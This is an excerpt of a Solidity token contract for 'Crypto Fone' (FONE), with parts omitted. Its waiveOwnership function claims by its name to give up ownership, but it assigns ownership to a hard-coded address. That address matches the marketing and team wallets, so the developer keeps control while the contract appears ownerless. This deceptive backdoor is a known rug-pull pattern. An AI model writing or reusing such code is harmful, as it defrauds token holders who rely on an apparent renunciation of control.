...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x031bA82F7c16273c1ee869996f5Df9652DEbC159);
    }
...
contract Cryptfone is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Crypto Fone";
    string private _symbol = "FONE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x031bA82F7c16273c1ee869996f5Df9652DEbC159);
    address payable public teamWalletAddress = payable(0x031bA82F7c16273c1ee869996f5Df9652DEbC159);
